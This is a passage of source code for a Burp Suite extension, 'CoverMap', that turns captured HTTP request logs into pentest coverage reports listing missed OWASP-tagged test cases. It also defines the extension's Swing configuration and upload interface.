                       '(identical titles across endpoints)</h3></section>\n')
    return (head + summary + toolbar + progress + findings_html + observations_html
            + grouped_section + "".join(cards) + tail)


_SEV_ORDER = {'CRITICAL': 0, 'HIGH': 1, 'MEDIUM': 2, 'LOW': 3}


def _owasp_short(o):
    m = re.match(r'(A\d+)', o or '')
    return m.group(1) if m else '--'


def _trunc(s, n=80):
    s = _u(s)
    return s if len(s) <= n else s[:n] + '...(truncated)'


def _reconstruct_qs(params):
    parts = []
    for k, vals in params.items():
        if isinstance(vals, list) and vals:
            for v in vals:
                parts.append("{0}={1}".format(k, v))
        else:
            parts.append("{0}=".format(k))
    return "&".join(parts)


def to_txt(audits, engagement):
    now = datetime.now().strftime("%Y-%m-%d %H:%M")
    out = [
        "PENTEST COVERAGE - PER-REQUEST RETEST REPORT",
        "Engagement : {0}".format(engagement),
        "Generated  : {0}".format(now),
        "Each block = one captured request; OWASP-tagged missed test cases listed below it.",
        "WARNING    : source data may contain live credentials/cookies - scrub before sharing.",
        "",
    ]
    i = 0
    for a in audits:
        i += 1
        fn = _infer_fn(a.path)
        fn_label = ", ".join(sorted(fn)) if fn else "general endpoint"
        sevs = set(gp.severity for gp in a.gaps)
        if 'CRITICAL' in sevs:
            priority = 'IMMEDIATE'
        elif 'HIGH' in sevs:
            priority = 'HIGH'
        else:
            priority = 'NORMAL'
        authed = a.auth_coverage.get('with_auth', 0) > 0
        if a.sample_requests:
            samples = a.sample_requests
        else:
            samples = [{
                'method': (a.methods_seen[0] if a.methods_seen else 'GET'),
                'path': a.path, 'query_params': {}, 'body_params': {},
                'status': '-', 'resp_len': '-',
            }]
        m = 0
        for sr in samples:
            m += 1
            method = sr.get('method', 'GET')
            qs = _reconstruct_qs(sr.get('query_params') or {})
            bp = sr.get('body_params') or {}
            line_path = a.path + ("?{0}".format(qs) if qs else "")
            out += [
                "=" * 62,
                "[EP{0}-R{1}]  {2} {3}".format(i, m, method, line_path),
                "Endpoint      : {0}{1}".format(a.host, a.path),
                "Inferred Fn   : {0}".format(fn_label),
                "Coverage      : {0}/100 - {1}   Priority: {2}".format(
                    a.coverage_score, score_label(a.coverage_score), priority),
                "Observed      : status={0}  resp_len={1}".format(
                    sr.get('status', '-'), sr.get('resp_len', '-')),
                "-" * 62, "RAW REQUEST", "-" * 62,
                "{0} {1} HTTP/1.1".format(method, line_path),
                "Host: {0}".format(a.host),
            ]
            if authed:
                out.append("Cookie: <authenticated session cookie>")
            if bp:
                out.append("Content-Type: application/x-www-form-urlencoded")
                out.append("")
                body_parts = []
                for k, v in bp.items():
                    val = (v[0] if isinstance(v, list) and v else v)
                    body_parts.append("{0}={1}".format(k, _trunc(val)))
                out.append("&".join(body_parts))
            elif not authed:
                out.append("(no auth header captured)")
            out += ["-" * 62, "MISSED TEST CASES", "-" * 62]
            if a.gaps:
                sorted_gaps = sorted(a.gaps, key=lambda x: _SEV_ORDER.get(x.severity, 9))
                j = 0
                for gp in sorted_gaps:
                    j += 1
                    tag = "[{0}]".format(_owasp_short(gp.owasp)) if gp.owasp else "[--]"
                    out.append("  {0}. {1}[{2}][{3}] {4}".format(j, tag, gp.severity, gp.category, gp.title))
                    out.append("      -> {0}".format(gp.recommendation))
            else:
                out.append("  (no gaps flagged)")
            out += ["=" * 62, ""]
    text = "\n".join(out)
    replacements = [('→', '->'), ('—', '-'), ('–', '-'),
                    ('‘', "'"), ('’', "'"), ('“', '"'),
                    ('”', '"'), ('…', '...'), ('\xa0', ' ')]
    for uni, asc in replacements:
        try:
            text = text.replace(uni, asc)
        except Exception:
            pass
    try:
        return text.encode('ascii', 'replace').decode('ascii')
    except Exception:
        return text


# ============================================================
# OUTPUT DIRECTORY (named from scope)
# ============================================================

def _safe_dirname(s):
    s = re.sub(r'[<>:"/\\|?*]', '_', s)
    s = re.sub(r'\s+', '_', s)
    s = s.strip('._ ')
    return s or 'coverage'


def make_output_dir(base_dir, scope_list, engagement=''):
    """Build an output directory under base_dir named from the scope."""
    if scope_list:
        scope_label = "_".join(_safe_dirname(s) for s in scope_list[:3])
    elif engagement:
        scope_label = _safe_dirname(engagement)
    else:
        scope_label = 'coverage'
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    out_dir = os.path.join(base_dir, "{0}_coverage_{1}".format(scope_label, ts))
    if not os.path.exists(out_dir):
        os.makedirs(out_dir)
    return out_dir


def write_text_file(filepath, content):
    """Write UTF-8 text to a file (Jython 2.7-friendly).
    Py2/Jython: unicode -> utf-8 bytes; str (already bytes) -> as-is.
    Py3 fallback: str -> utf-8 bytes; bytes -> as-is."""
    try:
        is_unicode = isinstance(content, unicode)  # noqa: F821
    except NameError:
        is_unicode = isinstance(content, str)
    if is_unicode:
        content = content.encode('utf-8')
    f = open(filepath, 'wb')
    try:
        f.write(content)
    finally:
        f.close()


# ============================================================
# RUN PIPELINE (called from UI)
# ============================================================

def run_pipeline(input_files, scope_csv, engagement, output_base_dir,
                 formats, keep_static, keep_noise, exclude_path_csv, logger,
                 strict=False):
    """
    input_files: list of (filepath, fmt) tuples - fmt is 'csv' or 'json'
    scope_csv: comma-separated scope string
    engagement: engagement name
    output_base_dir: base directory (output files go in a scope-named subdir)
    formats: dict of {'html': bool, 'json': bool, 'txt': bool, 'markdown': bool}
    strict: when True, log each dropped row on parse failure (else just count)
    Returns: output directory path
    """
    scope_list = [s.strip() for s in scope_csv.split(',') if s.strip()] if scope_csv else []
    exclude_list = list(DEFAULT_NOISE_PATHS) if not keep_noise else []
    if exclude_path_csv:
        exclude_list += [p.strip() for p in exclude_path_csv.split(',') if p.strip()]

    all_requests = []
    for filepath, fmt in input_files:
        logger("Reading {0} ({1})".format(filepath, fmt.upper()))
        reqs = parse_loggerpp(filepath, fmt,
                              filter_static=not keep_static,
                              scope=scope_list if scope_list else None,
                              exclude_paths=exclude_list,
                              logger=logger, strict=strict)
        logger("  -> {0} requests after filters".format(len(reqs)))
        all_requests.extend(reqs)

    if not all_requests:
        raise RuntimeError("No in-scope requests parsed. Check scope and input files.")

    logger("Building endpoint profiles from {0} requests...".format(len(all_requests)))
    profiles = build_profiles(all_requests)
    logger("  -> {0} unique endpoints".format(len(profiles)))

    # Drop non-existent endpoints (404-only crawler/scanner probes for paths that
    # don't exist on this app - a major false-positive source on .aspx/PHP/etc.).
    before = len(profiles)
    profiles = dict((k, v) for k, v in profiles.items() if not _is_nonexistent_endpoint(v))
    dropped = before - len(profiles)
    if dropped:
        logger("  Dropped {0} non-existent endpoint(s) (404-only probes) -> {1} real endpoints".format(
            dropped, len(profiles)))

    if not profiles:
        raise RuntimeError("All endpoints were 404-only probes; nothing real to analyse. "
                           "Check scope / that the capture includes real app traffic.")

    logger("Running gap analysis...")
    audits = analyse(profiles)

    out_dir = make_output_dir(output_base_dir, scope_list, engagement)
    logger("Output directory: {0}".format(out_dir))

    if not engagement:
        engagement = scope_list[0] if scope_list else 'Engagement'

    base_name = _safe_dirname(scope_list[0]) if scope_list else 'audit'

    if formats.get('markdown'):
        path = os.path.join(out_dir, "{0}_audit.md".format(base_name))
        write_text_file(path, to_markdown(audits, engagement))
        logger("  WROTE  {0}".format(path))

    if formats.get('json'):
        path = os.path.join(out_dir, "{0}_audit.json".format(base_name))
        write_text_file(path, to_json(audits))
        logger("  WROTE  {0}".format(path))

    if formats.get('html'):
        path = os.path.join(out_dir, "{0}_audit.html".format(base_name))
        write_text_file(path, to_html(audits, engagement))
        logger("  WROTE  {0}".format(path))

    if formats.get('txt'):
        path = os.path.join(out_dir, "{0}_audit.txt".format(base_name))
        write_text_file(path, to_txt(audits, engagement))
        logger("  WROTE  {0}".format(path))

    total = len(audits)
    avg = sum(a.coverage_score for a in audits) // max(total, 1)
    crit = sum(1 for a in audits for gp in a.gaps if gp.severity == 'CRITICAL')
    high = sum(1 for a in audits for gp in a.gaps if gp.severity == 'HIGH')
    logger("")
    logger("=== Summary ===")
    logger("  Endpoints:  {0}".format(total))
    logger("  Avg Score:  {0}/100  {1}".format(avg, score_label(avg)))
    logger("  Critical:   {0}".format(crit))
    logger("  High:       {0}".format(high))
    logger("")
    return out_dir


# ============================================================
# BURP EXTENSION + SWING UI
# ============================================================

if BURP_AVAILABLE:

    class BurpExtender(IBurpExtender, ITab):
        EXTENSION_NAME = "CoverMap"

        def registerExtenderCallbacks(self, callbacks):
            self._callbacks = callbacks
            self._helpers = callbacks.getHelpers()
            callbacks.setExtensionName(self.EXTENSION_NAME)

            self._stdout = callbacks.getStdout()
            self._stderr = callbacks.getStderr()

            self._uploaded_files = []  # list of (path, fmt)

            self._build_ui()
            callbacks.addSuiteTab(self)
            self._log("CoverMap loaded. Define scope, upload CSV/JSON, then click 'Run Analysis'.")

        # ITab
        def getTabCaption(self):
            return self.EXTENSION_NAME

        def getUiComponent(self):
            return self._root

        # ─── UI construction ─────────────────────────────────────
        def _build_ui(self):
            self._root = JPanel(BorderLayout())

            # Top: scope/config form
            form = JPanel(GridBagLayout())
            form.setBorder(BorderFactory.createTitledBorder("Scope & Configuration"))
            gbc = GridBagConstraints()
            gbc.insets = Insets(4, 6, 4, 6)
            gbc.anchor = GridBagConstraints.WEST
            gbc.fill = GridBagConstraints.HORIZONTAL

            def add_row(row, label_text, comp, weightx=1.0):
                gbc.gridy = row
                gbc.gridx = 0
                gbc.weightx = 0.0
                form.add(JLabel(label_text), gbc)
                gbc.gridx = 1
                gbc.weightx = weightx
                gbc.gridwidth = 2
                form.add(comp, gbc)
                gbc.gridwidth = 1

            self._scope_field = JTextField("", 40)
            self._scope_field.setToolTipText(
                "Comma-separated in-scope host(s). e.g. 'app.target.com,*.target.com'. "
                "Used to filter requests AND as the output directory name.")
            add_row(0, "Scope (hosts):", self._scope_field)

            self._engagement_field = JTextField("Engagement", 40)
            add_row(1, "Engagement name:", self._engagement_field)

            self._exclude_field = JTextField("", 40)
            self._exclude_field.setToolTipText(
                "Optional extra path substrings to drop (comma-separated). "
                "Built-in WAF/CDN/telemetry denylist is applied unless 'Keep noise' is checked.")
            add_row(2, "Extra exclude paths:", self._exclude_field)

            self._output_dir_field = JTextField(os.getcwd(), 40)
            self._output_dir_field.setToolTipText(
                "Base output directory. Reports are written into a scope-named subdirectory inside it.")
            btn_pick_dir = JButton("Browse...", actionPerformed=self._pick_output_dir)
            out_panel = JPanel(BorderLayout())
            out_panel.add(self._output_dir_field, BorderLayout.CENTER)
            out_panel.add(btn_pick_dir, BorderLayout.EAST)
            add_row(3, "Output base dir:", out_panel)

            # Format checkboxes
            self._cb_html = JCheckBox("HTML", True)
            self._cb_json = JCheckBox("JSON", True)
            self._cb_txt = JCheckBox("TXT", True)
            self._cb_md = JCheckBox("Markdown", False)
            self._cb_keep_static = JCheckBox("Keep static assets (.js/.css/img)", False)
            self._cb_keep_noise = JCheckBox("Keep noise paths (CDN/telemetry)", False)
            self._cb_strict = JCheckBox("Strict (log dropped rows)", False)
            self._cb_strict.setToolTipText(
                "On a parse failure, log the offending row instead of silently dropping it. "
                "A dropped-row count is always reported regardless of this setting.")

            fmt_panel = JPanel(FlowLayout(FlowLayout.LEFT, 6, 0))
            fmt_panel.add(JLabel("Output formats:"))
            fmt_panel.add(self._cb_html)
            fmt_panel.add(self._cb_json)
            fmt_panel.add(self._cb_txt)
            fmt_panel.add(self._cb_md)
            add_row(4, "", fmt_panel)

            flt_panel = JPanel(FlowLayout(FlowLayout.LEFT, 6, 0))
            flt_panel.add(self._cb_keep_static)
            flt_panel.add(self._cb_keep_noise)
            flt_panel.add(self._cb_strict)
            add_row(5, "", flt_panel)

            # Buttons row: Upload CSV / Upload JSON / Clear / Run
            btn_panel = JPanel(FlowLayout(FlowLayout.LEFT, 6, 0))
            self._btn_csv = JButton("Upload CSV (Burp Logger)", actionPerformed=self._upload_csv)
            self._btn_json = JButton("Upload JSON (Logger++)", actionPerformed=self._upload_json)
            self._btn_clear = JButton("Clear files", actionPerformed=self._clear_files)
            self._btn_run = JButton("Run Analysis", actionPerformed=self._run_clicked)
            self._btn_open_out = JButton("Open output folder", actionPerformed=self._open_last_output)
            self._btn_run.setFont(self._btn_run.getFont().deriveFont(Font.BOLD))
            btn_panel.add(self._btn_csv)
            btn_panel.add(self._btn_json)
            btn_panel.add(self._btn_clear)
            btn_panel.add(self._btn_run)
            btn_panel.add(self._btn_open_out)
            add_row(6, "", btn_panel)

            self._files_label = JLabel("No files uploaded.")
            self._files_label.setFont(self._files_label.getFont().deriveFont(Font.ITALIC))
            add_row(7, "Files:", self._files_label)

            self._root.add(form, BorderLayout.NORTH)

            # Center: log area
            self._log_area = JTextArea()
            self._log_area.setEditable(False)
            self._log_area.setFont(Font("Monospaced", Font.PLAIN, 12))
            scroll = JScrollPane(self._log_area)
            scroll.setBorder(BorderFactory.createTitledBorder("Log"))
            self._root.add(scroll, BorderLayout.CENTER)

            self._last_output_dir = None

        # ─── helpers ─────────────────────────────────────────────
        def _log(self, msg):
            line = "[{0}] {1}\n".format(datetime.now().strftime("%H:%M:%S"), msg)
            try:
                self._log_area.append(line)
                self._log_area.setCaretPosition(self._log_area.getDocument().getLength())
            except Exception:
                pass
            try:
                if self._stdout is not None:
                    self._stdout.write(line.encode('utf-8'))
            except Exception:
                pass

        def _set_busy(self, busy):
            self._btn_csv.setEnabled(not busy)
            self._btn_json.setEnabled(not busy)
            self._btn_clear.setEnabled(not busy)
            self._btn_run.setEnabled(not busy)

        def _update_files_label(self):
            if not self._uploaded_files:
                self._files_label.setText("No files uploaded.")
                return
            names = []
            for p, fmt in self._uploaded_files:
                names.append("{0} [{1}]".format(os.path.basename(p), fmt.upper()))
            self._files_label.setText(" | ".join(names))

        # ─── actions ─────────────────────────────────────────────
        def _pick_output_dir(self, evt):
            chooser = JFileChooser(self._output_dir_field.getText() or os.getcwd())
            chooser.setFileSelectionMode(JFileChooser.DIRECTORIES_ONLY)
            chooser.setDialogTitle("Select output base directory")
            if chooser.showOpenDialog(self._root) == JFileChooser.APPROVE_OPTION:
                self._output_dir_field.setText(chooser.getSelectedFile().getAbsolutePath())

        def _upload_csv(self, evt):
            chooser = JFileChooser()
            chooser.setDialogTitle("Select Burp Logger CSV (or Logger++ CSV)")
            chooser.setFileFilter(FileNameExtensionFilter("CSV files (*.csv)", ["csv"]))
            chooser.setMultiSelectionEnabled(True)
            if chooser.showOpenDialog(self._root) == JFileChooser.APPROVE_OPTION:
                for f in chooser.getSelectedFiles():
                    path = f.getAbsolutePath()
                    self._uploaded_files.append((path, 'csv'))
                    self._log("Added CSV: {0}".format(path))
                self._update_files_label()

        def _upload_json(self, evt):
            chooser = JFileChooser()
            chooser.setDialogTitle("Select Logger++ JSON export")
            chooser.setFileFilter(FileNameExtensionFilter("JSON files (*.json)", ["json"]))
            chooser.setMultiSelectionEnabled(True)
            if chooser.showOpenDialog(self._root) == JFileChooser.APPROVE_OPTION:
                for f in chooser.getSelectedFiles():
                    path = f.getAbsolutePath()
                    self._uploaded_files.append((path, 'json'))
                    self._log("Added JSON: {0}".format(path))
                self._update_files_label()

        def _clear_files(self, evt):
            self._uploaded_files = []
            self._update_files_label()
            self._log("Cleared uploaded files.")

        def _open_last_output(self, evt):
            if not self._last_output_dir or not os.path.exists(self._last_output_dir):
                JOptionPane.showMessageDialog(self._root, "No output directory yet. Run analysis first.",
                                              "CoverMap", JOptionPane.INFORMATION_MESSAGE)
                return
            try:
                # Use OS-native open
                from java.awt import Desktop
                Desktop.getDesktop().open(File(self._last_output_dir))
            except Exception:
                e = traceback.format_exc()
                self._log("Could not open folder: {0}".format(e))

        def _run_clicked(self, evt):
            if not self._uploaded_files:
                JOptionPane.showMessageDialog(self._root,
                    "Upload at least one CSV or JSON file first.",
                    "CoverMap", JOptionPane.WARNING_MESSAGE)
                return

            scope = self._scope_field.getText().strip()
            engagement = self._engagement_field.getText().strip() or 'Engagement'
            out_base = self._output_dir_field.getText().strip() or os.getcwd()
            exclude = self._exclude_field.getText().strip()
            formats = {
                'html': self._cb_html.isSelected(),
                'json': self._cb_json.isSelected(),
                'txt': self._cb_txt.isSelected(),
                'markdown': self._cb_md.isSelected(),
            }
            if not any(formats.values()):
                JOptionPane.showMessageDialog(self._root,
                    "Pick at least one output format.",
                    "CoverMap", JOptionPane.WARNING_MESSAGE)
                return

            if not os.path.isdir(out_base):
                try:
                    os.makedirs(out_base)
                except Exception:
                    JOptionPane.showMessageDialog(self._root,
                        "Output base directory does not exist and could not be created:\n{0}".format(out_base),
                        "CoverMap", JOptionPane.ERROR_MESSAGE)
                    return

            files_snapshot = list(self._uploaded_files)
            keep_static = self._cb_keep_static.isSelected()
            keep_noise = self._cb_keep_noise.isSelected()
            strict = self._cb_strict.isSelected()

            ext = self

            class _Worker(Runnable):
                def run(self):
                    ext._set_busy(True)
                    try:
                        ext._log("=" * 60)
                        ext._log("Run starting | scope='{0}' | engagement='{1}'".format(scope, engagement))
                        out_dir = run_pipeline(
                            files_snapshot, scope, engagement, out_base,
                            formats, keep_static, keep_noise, exclude, ext._log,
                            strict=strict)
                        ext._last_output_dir = out_dir
                        ext._log("DONE. Reports in: {0}".format(out_dir))
                    except Exception:
                        ext._log("ERROR:\n{0}".format(traceback.format_exc()))
                    finally:
                        ext._set_busy(False)

            Thread(_Worker()).start()
